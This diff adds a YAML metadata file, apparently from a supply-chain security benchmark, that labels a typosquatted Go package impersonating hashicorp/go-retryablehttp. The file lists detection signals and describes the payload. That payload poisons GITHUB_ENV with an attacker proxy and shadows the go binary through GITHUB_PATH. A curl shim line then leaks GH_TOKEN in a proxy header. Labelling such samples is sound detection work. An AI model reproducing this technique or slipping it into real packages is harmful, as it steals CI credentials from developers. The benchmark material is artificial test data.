@@ -1,0 +1,55 @@
+name: go-retryablehttp
+ecosystem: golang
+type: malicious
+category: layered
+attack_vectors:
+  - typosquatting
+  - build-time-execution
+  - test-time-execution
+techniques:
+  - init-function-payload
+  - github-env-file-poisoning
+  - http-proxy-hijack
+  - github-path-poisoning
+  - go-binary-path-shadowing
+  - xor-obfuscation
+impersonates: github.com/hashicorp/go-retryablehttp
+mirrors_incident: "Novel technique — GITHUB_ENV proxy poisoning + build cache PATH shadowing (2026)"
+payload_actions:
+  - github-env-write
+  - github-path-write
+  - http-proxy-override
+  - go-shim-install
+  - proxy-header-exfil
+exfil_method: https-connect-proxy-header
+expected_signals:
+  - "init() with os.Getenv('GITHUB_ENV')"
+  - "os.OpenFile on env-derived path with O_WRONLY"
+  - "writes HTTPS_PROXY / HTTP_PROXY to $GITHUB_ENV"
+  - "exec.LookPath('go') — resolving binary at runtime"
+  - "os.WriteFile to path derived from GOCACHE"
+  - "os.OpenFile on GITHUB_PATH with O_WRONLY"
+  - "XOR-encoded byte slice (_ep) decoded at runtime (_dk)"
+  - "curl --proxy-header in shell shim written to disk"
+description: >
+  Impersonates github.com/hashicorp/go-retryablehttp. The init() function fires
+  on both `go test` and `go run`. When GITHUB_ENV is present (GitHub Actions) it:
+
+  1. Decodes the XOR-obfuscated proxy address (_ep / _dk) and writes HTTPS_PROXY
+     and HTTP_PROXY into $GITHUB_ENV — all subsequent steps route traffic through
+     the attacker-controlled proxy.
+
+  2. Resolves the real `go` binary path via exec.LookPath, writes a shell shim
+     to $GOCACHE/go, and prepends $GOCACHE to PATH via $GITHUB_PATH.
+
+  On the next `go build` (or any go invocation), the shim fires:
+    curl https://proxy.golang.org/... --proxy-header "X-Token: ${GH_TOKEN}" ...
+  The proxy sees the Authorization-class header in the CONNECT request (cleartext,
+  before TLS is established). The real go binary is then exec'd transparently so
+  the build succeeds normally.
+
+  The default proxy endpoint is XOR-encoded with key "retryhttp" and decodes to
+  http://localhost:9292 (the benchmark collector). Override with PKG_ANALYTICS_URL.
+
+  Production binaries are NOT affected: init() only poisons the CI environment
+  file and PATH, not the compiled binary itself.
